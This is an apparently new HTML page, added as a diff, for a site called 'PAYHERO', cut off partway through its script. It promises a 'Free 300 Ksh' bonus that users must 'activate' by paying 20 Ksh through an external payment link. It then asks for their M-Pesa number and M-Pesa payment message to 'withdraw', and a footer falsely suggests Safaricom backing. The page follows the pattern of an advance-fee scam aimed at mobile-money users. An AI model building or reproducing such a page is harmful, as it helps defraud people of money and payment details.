@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login and Bonus Page</title>
+    <style>
+        body {
+            background-color: skyblue;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .login-form {
+            background-color: #333;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        .login-form h2 {
+            margin-bottom: 20px;
+        }
+        .login-form input[type="text"],
+        .login-form input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 20px;
+            background-color: #555;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-form .social-signups {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        .login-form .social-signups button {
+            width: 48%;
+            background-color: #555;
+            border-radius: 20px;
+            padding: 10px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .container {
+            background-color: black;
+            color: green;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 500px;
+            width: 100%;
+            display: none;
+            text-align: center;
+        }
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .bonus, .button {
+            background-color: #007BFF;
+            color: white;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            flex: 1;
+        }
+        .bonus:active, .button:active {
+            background-color: lightgreen;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: green;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .close {
+            background: #007BFF;
+            color: white;
+            padding: 15px 15px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 10px 10px;
+            margin: 10px 0;
+            border-radius: 10px;
+            border: 1px solid #ccc;
+        }
+        footer {
+            color: green;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form" id="loginPage">
+        <h2>PAYHERO</h2>
+        <form onsubmit="handleLogin(event)">
+            <input type="text" id="username" placeholder="create your username" required>
+            <input type="password" id="password" placeholder="Enter new password" required>
+            <button type="submit">Signup</button>
+        </form>
+        <div class="social-signups">
+            <button onclick="window.location.href='https://accounts.google.com/signup'">Sign up with Google</button>
+            <button onclick="window.location.href='https://telegram.org/auth'">Sign up with Telegram</button>
+        </div>
+    </div>
+    <div class="container" id="bonusPage">
+        <h2>HERO DASHBOARD</h2>
+        <div class="button-group">
+            <button class="bonus" onclick="showBonusModal()"> Free 300 Ksh</button>
+            <button class="button" onclick="alert('Coming soon')">Buy Airtime</button>
+            <button class="button" onclick="alert('Coming soon')">Pay Bills</button>
+            <button class="button" onclick="showWithdrawModal()">Withdraw bonous</button>
+        </div>
+    </div>
+    <!-- Bonus Modal -->
+    <div class="modal" id="bonusModal">
+        <div class="modal-content">
+            <h3>Pay at least 20 Ksh to activate your bonus</h3>
+            <button class="button" onclick="window.location.href='https://app.payhero.co.ke/lipwa/868'">Pay</button>
+            <button class="close" onclick="closeBonusModal()">Close</button>
+        </div>
+    </div>
+    <!-- Withdraw Modal -->
+    <div class="modal" id="withdrawModal">
+        <div class="modal-content">
+            <h3>Withdraw</h3>
+            <label for="mpesaNumber">M-Pesa Number:</label>
+            <input type="text" id="mpesaNumber" placeholder="Enter your M-Pesa number" required>
+            <label for="paymentMessage">Payment Message:</label>
+            <input type="text" id="paymentMessage" placeholder="Enter the M-Pesa payment message" required>
+            <button class="button" onclick="submitWithdraw()">Submit</button>
+            <button class="close" onclick="closeWithdrawModal()">Close</button>
+        </div>
+    </div>
+    <footer>powered by Activist ©safaricom</footer>
+    <script>
+        let userCredentials = {};
+        function handleLogin(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (!userCredentials.username) {
+                userCredentials = { username, password };
+                alert('Signup successful! You can now login.');
+            } else if (username === userCredentials.username && password === userCredentials.password) {
+                document.getElementById('loginPage').style.display = '
